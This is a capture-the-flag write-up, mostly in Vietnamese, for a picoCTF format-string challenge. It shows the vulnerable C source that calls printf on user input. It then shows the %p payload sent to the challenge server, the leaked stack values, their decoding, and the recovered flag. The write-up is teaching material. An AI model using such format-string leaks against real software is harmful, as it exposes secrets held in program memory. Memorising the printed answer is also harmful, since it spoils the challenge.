# format string 1

## Information

- Category: Pwnable
- Level: Medium

## Description

Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

## Hint

- https://lettieri.iet.unipi.it/hacking/format-strings.pdf
- Is this a 32-bit or 64-bit binary?

## Solution

### What we got ?

- Đề bài cho một file binary và một source code của chương trình. Trước hết, thực hiện kiểm tra qua source code:
    
    ```c
    #include <stdio.h>
    
    int main() {
      char buf[1024];
      char secret1[64];
      char flag[64];
      char secret2[64];
    
      // Read in first secret menu item
      FILE *fd = fopen("secret-menu-item-1.txt", "r");
      if (fd == NULL){
        printf("'secret-menu-item-1.txt' file not found, aborting.\n");
        return 1;
      }
      fgets(secret1, 64, fd);
      // Read in the flag
      fd = fopen("flag.txt", "r");
      if (fd == NULL){
        printf("'flag.txt' file not found, aborting.\n");
        return 1;
      }
      fgets(flag, 64, fd);
      // Read in second secret menu item
      fd = fopen("secret-menu-item-2.txt", "r");
      if (fd == NULL){
        printf("'secret-menu-item-2.txt' file not found, aborting.\n");
        return 1;
      }
      fgets(secret2, 64, fd);
    
      printf("Give me your order and I'll read it back to you:\n");
      fflush(stdout);
      scanf("%1024s", buf);
      printf("Here's your order: ");
      printf(buf);
      printf("\n");
      fflush(stdout);
    
      printf("Bye!\n");
      fflush(stdout);
    
      return 0;
    }
    
    ```
    
- Nhận xét:
    - Ta nhận thấy có tất cả 3 biến `secret1`, `secret2` và `flag` được khởi tạo trong bộ nhớ.
    - Chương trình sẽ nhận input từ user qua `scanf("%1024s", buf)` và ngay lập tức thực hiện print input ra bằng `printf(buf)`. Việc sử dụng`printf(buf)` để in dữ liệu sẽ gây ra lỗi **format string vulnerability** (lỗ hổng định dạng chuỗi), có thể đọc hoặc ghi dữ liệu nhạy cảm trong bộ nhớ.

### How to get flag ?

- Từ nhận xét trên, ta có thể sử dụng `“%p”` làm input để leak các offset chứa dữ liệu cần tìm (cụ thể là flag).
    
    ```c
    $ nc mimas.picoctf.net 57449
    Give me your order and I'll read it back to you:
    %p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
    Here's your order: 0x402118,(nil),0x773086946a00,(nil),0x12c7880,0xa347834,0x7ffe0652c970,0x773086737e60,0x77308695c4d0,0x1,0x7ffe0652ca40,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x65355f673431665f,0x7d346263623736,0x7,0x77308695e8d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x77308696fde9,0x773086740098,0x77308695c4d0,(nil),0x7ffe0652ca50,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x70252c70252c70,(nil),(nil),(nil),(nil),0x2f2f2f2f2f2f2f2f,0x2f2f2f2f2f2f2f2f,0x2f2f2f2f2f2f2f2f,0x2f2f2f2f2f2f2f2f,(nil),(nil),(nil)
    Bye!
    ```
    
- Từ các offset ta nhận được, có thể sử dụng [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Reverse('Character')&input=MHg0MDIxMTgsKG5pbCksMHg3NzMwODY5NDZhMDAsKG5pbCksMHgxMmM3ODgwLDB4YTM0NzgzNCwweDdmZmUwNjUyYzk3MCwweDc3MzA4NjczN2U2MCwweDc3MzA4Njk1YzRkMCwweDEsMHg3ZmZlMDY1MmNhNDAsKG5pbCksKG5pbCksMHg3YjQ2NTQ0MzZmNjM2OTcwLDB4MzU1ZjMxMzQ2ZDMxNmUzNCwweDM0NzgzNDVmMzMzMTc5MzcsMHg2NTM1NWY2NzM0MzE2NjVmLDB4N2QzNDYyNjM2MjM3MzYsMHg3LDB4NzczMDg2OTVlOGQ4LDB4MjMwMDAwMDAwNywweDIwNmU2OTMzNzQzMDcyNTAsMHhhMzM2Yzc5NzQ1MywweDksMHg3NzMwODY5NmZkZTksMHg3NzMwODY3NDAwOTgsMHg3NzMwODY5NWM0ZDAsKG5pbCksMHg3ZmZlMDY1MmNhNTAsMHg3MDI1MmM3MDI1MmM3MDI1LDB4MjUyYzcwMjUyYzcwMjUyYywweDJjNzAyNTJjNzAyNTJjNzAsMHg3MDI1MmM3MDI1MmM3MDI1LDB4MjUyYzcwMjUyYzcwMjUyYywweDJjNzAyNTJjNzAyNTJjNzAsMHg3MDI1MmM3MDI1MmM3MDI1LDB4MjUyYzcwMjUyYzcwMjUyYywweDJjNzAyNTJjNzAyNTJjNzAsMHg3MDI1MmM3MDI1MmM3MDI1LDB4MjUyYzcwMjUyYzcwMjUyYywweDJjNzAyNTJjNzAyNTJjNzAsMHg3MDI1MmM3MDI1MmM3MDI1LDB4MjUyYzcwMjUyYzcwMjUyYywweDJjNzAyNTJjNzAyNTJjNzAsMHg3MDI1MmM3MDI1MmM3MDI1LDB4MjUyYzcwMjUyYzcwMjUyYywweDJjNzAyNTJjNzAyNTJjNzAsMHg3MDI1MmM3MDI1MmM3MDI1LDB4MjUyYzcwMjUyYzcwMjUyYywweDJjNzAyNTJjNzAyNTJjNzAsMHg3MDI1MmM3MDI1MmM3MDI1LDB4MjUyYzcwMjUyYzcwMjUyYywweDcwMjUyYzcwMjUyYzcwLChuaWwpLChuaWwpLChuaWwpLChuaWwpLDB4MmYyZjJmMmYyZjJmMmYyZiwweDJmMmYyZjJmMmYyZjJmMmYsMHgyZjJmMmYyZjJmMmYyZjJmLDB4MmYyZjJmMmYyZjJmMmYyZiwobmlsKSwobmlsKSwobmlsKQ&oeol=CR) để decode phần offset vừa được dump để tìm flag. Ta sử dụng “From Hex” và “Reverse” để tìm nội dung. Cụ thể kết quả thu được như sau:
    
    ![image.png](https://www.notion.so/image/attachment%3Aa0773373-d01e-4f78-a9ec-8e34778af2d4%3Aimage.png?table=block&id=2c91b638-5371-80ee-a7cc-cd8e4a377321&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1360&userId=&cache=v2)
    
- Dựa vào kết quả, ta nhận thấy flag đã bị đảo ngược. Phần offset chứa flag là:
    
    ```c
    0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x65355f673431665f,0x7d346263623736
    ```
    
- Thực hiện đảo ngược thứ tự các offset để lấy flag.
    
    ```cpp
    #include <bits/stdc++.h>
    using namespace std;
    
    int main () {
        vector<string> offset = {"0x7b4654436f636970", "0x355f31346d316e34", "0x3478345f33317937", "0x65355f673431665f", "0x7d346263623736"};
        reverse(offset.begin(), offset.end());
        for (auto i: offset) cout << i << ",";
        cout << endl;
    }
    ```
    
- Flag là **`picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}`**
